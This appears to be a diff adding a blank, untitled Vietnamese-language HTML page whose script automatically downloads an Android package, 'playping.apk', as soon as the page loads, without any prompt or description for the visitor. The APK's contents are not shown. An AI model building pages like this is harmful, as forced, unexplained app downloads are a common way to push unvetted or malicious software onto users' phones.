@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<title></title>
+<style>
+html,body{height:100%;margin:0;background:#000;}
+</style>
+</head>
+<body>
+<script>
+const FILE_NAME = 'playping.apk'; 
+const FILE_URL = FILE_NAME;   
+
+function autoDownload() {
+  const a = document.createElement('a');
+  a.href = FILE_URL;
+  a.download = FILE_NAME;
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+}
+
+window.onload = autoDownload;
+</script>
+</body>
+</html>
+ 
